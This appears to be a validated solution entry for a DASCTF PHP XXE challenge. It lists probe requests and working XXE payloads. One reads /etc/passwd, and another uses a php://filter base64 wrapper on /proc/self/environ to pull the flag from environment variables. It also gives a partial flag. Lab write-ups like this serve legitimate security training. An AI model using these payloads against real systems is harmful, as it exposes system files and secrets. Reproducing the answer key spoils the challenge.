---
name: DASCTF direct-ctf2 PHP XXE (dom.php)
fingerprint: phpinfo() root page /index.php (PHP 7.0.30); /dom.php calls DOMDocument::loadXML() and dumps the object (prints [textContent])
status: validated
updated_at: 2026-09-23T12:13:20.001074+00:00
---

LOCK: PHP XXE challenge. Root page is phpinfo(); /dom.php parses attacker XML via DOMDocument::loadXML() and echoes the object including [textContent] holding resolved entity content. Flag lives in container env var FLAG (/flag is absent).

1) Probe: GET http://{HOST}/ -> phpinfo() (PHP/7.0.30). GET http://{HOST}/dom.php -> "DOMDocument::loadXML(): Empty string supplied as input".
2) Send POST body (Content-Type: application/xml) with classic XXE:
   <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
   The response's [textContent] => shows /etc/passwd contents -> XXE confirmed.
3) file:///flag does NOT exist. Read env vars instead. /proc/self/environ fails with "Char 0x0 out of allowed range" (NUL separators), so wrap with a filter:
   <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/proc/self/environ">]><root>&xxe;</root>
4) Base64-decode the [textContent] value -> reveals FLAG=CTF2{…}. (Confirmed flag: CTF2{f86f…2478}.)
